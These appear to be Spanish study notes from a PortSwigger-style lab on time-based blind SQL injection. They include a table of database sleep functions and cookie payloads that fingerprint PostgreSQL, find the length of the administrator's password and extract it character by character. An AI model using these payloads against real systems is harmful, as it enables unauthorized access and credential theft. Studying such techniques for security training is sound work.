Podemos manipular los tiempos de respuestas para basado en la demora determinar si es correcto o no lo que estamos solicitando

Nos vamos al cheat sheet de PortSwigger para ver como manejan los tiempos las BD
https://portswigger.net/web-security/sql-injection/cheat-sheet

|            |                                       |
| ---------- | ------------------------------------- |
| Oracle     | `dbms_pipe.receive_message(('a'),10)` |
| Microsoft  | `WAITFOR DELAY '0:0:10'`              |
| PostgreSQL | `SELECT pg_sleep(10)`                 |
| MySQL      | `SELECT SLEEP(10)`                    |
Por lo que probarimos esto como inyeccion en el navegador y asi podriamos deerminar la BD 
EJ
```
Nos da que es una bd en postgres 
TrackingId=e1FnFDt0teYGBcsH'|| pg_sleep(10) --
```

Atendiendo a los tiempos podemos deliberar si me da una respuesta valida o no 
```
;  = %3b el ; se urlencode para que no entre en conflicto con la separacion de las cookie y forme parte de la cadena 

Para probar que funcionan los tiempos si es True demoa si no no demora
'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--

Luego probarimos con datos par ver si acertamos la longitud del password
TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--

Una vez determinada la longitud pasariamos a intentar descifrarla
TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```